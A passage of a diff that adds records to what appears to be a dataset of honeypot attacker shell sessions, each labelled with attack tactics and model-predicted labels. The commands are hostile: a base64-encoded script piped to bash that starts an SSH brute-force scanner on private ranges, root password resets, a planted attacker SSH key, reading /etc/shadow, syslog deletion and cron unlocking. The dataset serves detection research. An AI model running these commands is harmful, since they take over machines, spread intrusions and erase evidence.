IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= | base64 --decode | bash ;",
+        "labels":"Discovery - 2 -- Persistence - 6 -- Discovery - 30 -- Execution - 40",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:RJOmU4uNN11s <sep> chpasswd <sep> bash <sep> echo 321 > \/var\/tmp\/.var03522123 <sep> rm -rf \/var\/tmp\/.var03522123 <sep> cat \/var\/tmp\/.var03522123 <sep> head -n 1 <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> which ls <sep> ls -lh $which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> echo root japan > \/tmp\/up.txt <sep> rm -rf \/var\/tmp\/dota* <sep> cat \/var\/tmp\/.systemcache436621 <sep> echo 1 > \/var\/tmp\/.systemcache436621 <sep> cat \/var\/tmp\/.systemcache436621 <sep> sleep 15s <sep> cd \/var\/tmp <sep> echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= <sep> base64 --decode <sep> bash <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution"
+    },
+    {
+        "session":"\/bin\/ls -l \/etc\/lilo.conf ; grep -c ^[^hash_symbol]*password=.*$ \/etc\/lilo.conf ; \/sbin\/sysctl net.ipv4.conf.all.accept_source_route ;",
+        "labels":"Discovery - 1 -- Impact - 2",
+        "session_expanded":"\/bin\/ls -l \/etc\/lilo.conf <sep> grep -c ^[^hash_symbol]*password=.*$ \/etc\/lilo.conf <sep> \/sbin\/sysctl net.ipv4.conf.all.accept_source_route <sep> ",
+        "labels_expanded":"Discovery - Discovery - Impact",
+        "labels_predicted":"Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"ulimit -n 65535 ; rm -rf \/var\/log\/syslog ; chattr -iua \/tmp\/ ; chattr -iua \/var\/tmp\/ ; chattr -R -i \/var\/spool\/cron ; chattr -i \/etc\/crontab ;",
+        "labels":"Defense Evasion - 1 -- Harmless - 5",
+        "session_expanded":"ulimit -n 65535 <sep> rm -rf \/var\/log\/syslog <sep> chattr -iua \/tmp\/ <sep> chattr -iua \/var\/tmp\/ <sep> chattr -R -i \/var\/spool\/cron <sep> chattr -i \/etc\/crontab <sep> ",
+        "labels_expanded":"Defense Evasion - Defense Evasion - Harmless - Harmless - Harmless - Harmless",
+        "labels_predicted":"Execution - Defense Evasion - Defense Evasion - Defense Evasion - Defense Evasion - Defense Evasion"
+    },
+    {
+        "session":"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ; cat \/proc\/cpuinfo | grep name | wc -l ; echo -e doctornL4AqLIW6xS83nL4AqLIW6xS83 | passwd | bash ; Enter new UNIX password: ; echo doctornL4AqLIW6xS83nL4AqLIW6xS83n | passwd ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+        "labels":"Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Harmless - 12 -- Persistence - 14 -- Discovery - 56",
+        "session_expanded":"cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo -e doctornL4AqLIW6xS83nL4AqLIW6xS83 <sep> passwd <sep> bash <sep> Enter new UNIX password: <sep> echo doctornL4AqLIW6xS83nL4AqLIW6xS83n <sep> passwd <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> which ls <sep> ls -lh $which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> ",
+        "labels_expanded":"Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Harmless - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"ps ; cat \/etc\/passwd ; cat \/etc\/shadow ; su root & whoami ; sudo su root & whoami ; uname -a ; df ; fdisk -l ; cat \/proc\/mounts ;",
+        "labels":"Discovery - 8",
+        "session_expanded":"ps <sep> cat \/etc\/passwd <sep> cat \/etc\/shadow <sep> su root & whoami <sep> sudo su root & whoami <sep> uname -a <sep> df <sep> fdisk -l <sep> cat \/proc\/mounts <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Execution - Execution - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo 321 > \/var\/tmp\/.var03522123 ; rm -rf \/var\/tmp\/.var03522123 ; cat \/var\/tmp\/.var03522123 | head -n 1 ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin wc-net > \/tmp\/up.txt ; rm -rf \/var\/tmp\/dota* ;",
+        "labels":"Discovery - 28",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo 321 > \/var\/tmp\/.var03522123 <sep> rm -rf \/var\/tmp\/.var03522123 <sep> cat \/var\/tmp\/.var03522123 <sep> head -n 1 <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> echo admin wc-net > \/tmp\/up.txt <sep> rm -rf \/var\/tmp\/dota* <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Discovery"
+    }
+]
